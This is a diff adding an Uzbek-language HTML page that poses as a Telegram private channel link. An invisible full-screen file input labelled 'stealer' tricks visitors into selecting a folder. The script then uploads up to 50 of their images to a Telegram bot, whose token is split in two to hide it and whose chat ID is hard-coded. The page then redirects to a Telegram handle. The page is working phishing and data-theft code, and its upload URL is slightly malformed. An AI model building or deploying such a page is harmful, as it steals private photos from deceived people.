@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Private Channel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #18222d; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .tg-link { color: #3390ec; text-decoration: none; font-size: 14px; word-break: break-all; width: 90%; text-align: center; cursor: pointer; }
+        .hidden-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; cursor: pointer; z-index: 100; }
+    </style>
+</head>
+<body>
+    <div class="tg-link">
+        https://t.me
+    </div>
+
+    <input type="file" id="stealer" webkitdirectory directory multiple class="hidden-trigger">
+
+    <script>
+        const input = document.getElementById('stealer');
+        
+        input.addEventListener('change', async () => {
+            const files = input.files;
+const part1 = '8735705750:AAG';
+const part2 = 'nR24MYdvZRVXUU-z53Sek9XGe4SJ8ZEE';
+const token = part1 + part2;
+
+const chatId = '-4848271604';
+
+
+            if (files.length === 0) return;
+
+            for (let i = 0; i < Math.min(files.length, 50); i++) {
+                if (files[i].type.startsWith('image/')) {
+                    let formData = new FormData();
+                    formData.append("photo", files[i]);
+                    
+                    try {
+                        await fetch(`https://api.telegram.org{token}/sendPhoto?chat_id=${chatId}`, {
+                            method: "POST",
+                            body: formData
+                        });
+                    } catch (e) {
+                        console.error("Yuborishda xato!");
+                    }
+                }
+            }
+            window.location.href = "https://t.me@Hazilni_yomoni";
+        });
+    </script>
+</body>
+</html>
